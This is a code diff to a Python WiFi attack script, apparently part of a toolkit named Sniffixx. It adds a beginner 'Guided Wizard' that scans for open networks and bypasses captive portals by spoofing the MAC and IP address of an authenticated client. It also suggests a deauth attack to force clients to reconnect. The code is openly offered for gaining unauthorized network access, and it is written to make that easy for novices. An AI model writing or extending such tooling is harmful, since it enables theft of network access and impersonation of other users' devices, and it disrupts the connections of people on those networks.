@@ -8,6 +8,86 @@ script_dir = os.path.dirname(os.path.abspath(__file__))
 # Change working directory to the script's directory
 os.chdir(script_dir)
 
+def print_banner():
+    print("""
+╔═══════════════════════════════════════════════════════════╗
+║          Captive Portal Bypass - Guided Mode             ║
+╠═══════════════════════════════════════════════════════════╣
+║  This tool helps you bypass captive portals on open      ║
+║  WiFi networks by spoofing the MAC address of an           ║
+║  authenticated client.                                   ║
+║                                                           ║
+║  Step 1: Connect to an open network                      ║
+║  Step 2: Check if it has a captive portal               ║
+║  Step 3: Find an active client MAC (optional)           ║
+║  Step 4: Spoof that MAC to bypass the portal              ║
+╚═══════════════════════════════════════════════════════════╝
+""")
+
+def guided_wizard(iface):
+    """Guided wizard mode - explains each step"""
+    print("\n=== Guided Wizard Mode ===")
+    print("This mode will guide you through each step with explanations.")
+    print()
+    
+    # Step 1: Connect
+    print("📌 Step 1: Connect to an open network")
+    print("   We'll scan for networks without encryption.")
+    print("   If connection fails, try moving closer to the AP.")
+    print()
+    scan_reminder()
+    spoof_mac(iface)
+    ssid = pick_network_with_rescan(iface)
+
+    # Step 2: Connect and check
+    print("\n📌 Step 2: Connect to network")
+    print("   We'll attempt to connect and check for captive portal.")
+    connected = connect_open_network(iface, ssid)
+    if not connected:
+        print("❌ Connection failed. Suggestions:")
+        print("   - Move closer to the access point")
+        print("   - Try a different network")
+        print("   - Reset your adapter (option 22 in Sniffixx)")
+        input("\nPress Enter to retry...")
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+
+    # Step 3: Check for portal
+    print("\n📌 Step 3: Check for captive portal")
+    print("   We'll automatically check if a portal blocks internet access.")
+    portal_present = check_captive_portal()
+    
+    if portal_present:
+        print("""
+🔐 Captive portal DETECTED!
+   
+To bypass, you need the MAC address of an active, authenticated client.
+Options:
+  1) Use Sniffixx in a SECOND terminal to find clients
+  2) Try deauth attack to force client reconnection
+
+In Sniffixx, go to: Main Menu > 14 > 2 (Deep Scans with monitor mode)
+Find a client BSSID, then return here to continue.
+""")
+        input("Press Enter when ready to attempt bypass...")
+        
+        mac = input("[?] Enter client MAC to spoof (e.g., AA:BB:CC:DD:EE:FF): ").strip()
+        ip = input("[?] Enter client IP (e.g., 192.168.1.50): ").strip()
+        
+        print("\n📌 Step 4: Applying MAC spoof...")
+        spoof_identity(iface, mac, ip)
+        
+        print("\n📌 Step 5: Reconnecting...")
+        subprocess.run(["dhclient", iface])
+        
+        test_connectivity()
+        check_captive_portal()
+    else:
+        print("✅ No captive portal detected. Internet should work!")
+        test_connectivity()
+    
+    sniffing_menu(iface)
+
+
 def list_interfaces():
     result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
     return re.findall(r"Interface (\w+)", result.stdout)
@@ -278,8 +358,24 @@ Steps to prepare for captive portal bypass:
             
 def attempt_captive_portal_bypass(iface):
     print("\n=== Captive Portal Bypass ===")
-    mac = input("[?] Enter MAC to spoof: ").strip()
-    ip = input("[?] Enter IP to spoof: ").strip()
+    print("To bypass a captive portal, you need the MAC address of an already")
+    print("authenticated client. Use the Deep Scans menu to find one, or")
+    print("enter a MAC you know has access.")
+    print()
+    print("What is a BSSID/MAC? It's the unique identifier of a device.")
+    print("Format: XX:XX:XX:XX:XX:XX (e.g., AA:BB:CC:DD:EE:FF)")
+    print()
+    mac = input("[?] Enter MAC to spoof (client's BSSID): ").strip()
+    if not re.match(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$", mac):
+        print("❌ Invalid MAC format. Use XX:XX:XX:XX:XX:XX (e.g., AA:BB:CC:DD:EE:FF)")
+        print("   Make sure you have the correct MAC from an active client.")
+        return
+    
+    ip = input("[?] Enter client IP (e.g., 192.168.1.50): ").strip()
+    if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
+        print("❌ Invalid IP format. Use X.X.X.X (e.g., 192.168.1.50)")
+        return
+    
     spoof_identity(iface, mac, ip)
 
     print("[*] Reconnecting with spoofed identity...")
@@ -370,14 +466,29 @@ def get_subnet_from_route(iface):
     return None, None
 
 def main():
-    print("[*] Starting Captive Portal Bypass Script...\n")
-
+    print_banner()
+    
     print("📡 Current routing table:")
     subprocess.run(["ip", "route"])
 
-    choice = input("\nDo you want to:\n1) Scan and connect to a new network\n2) Use an already connected interface\nChoose (1/2): ").strip()
+    print("""
+Select mode:
+1) Guided Wizard (recommended for beginners)
+2) Scan and connect to a new network
+3) Use an already connected interface
+""")
+    choice = input("Choose (1/2/3): ").strip()
 
-    if choice == "2":
+    if choice == "1":
+        # Guided wizard mode
+        interfaces = list_interfaces()
+        if not interfaces:
+            print("❌ No wireless interfaces found.")
+            sys.exit(1)
+        print("\n[*] Available interfaces:", ", ".join(interfaces))
+        iface = input("[?] Enter your wireless interface: ").strip()
+        guided_wizard(iface)
+    elif choice == "3":
         interfaces = list_interfaces()
         print("\n[*] Available interfaces:", ", ".join(interfaces))
         iface = input("[?] Enter the connected interface to use: ").strip()
@@ -394,7 +505,7 @@ def main():
             print("⚠️ Could not extract IP/subnet from routing table. Try option 1 instead.")
             sys.exit(1)
 
-    elif choice == "1":
+    elif choice == "2":
         interfaces = list_interfaces()
         print("\n[*] Available interfaces:", ", ".join(interfaces))
         iface = input("[?] Enter your wireless interface: ").strip()
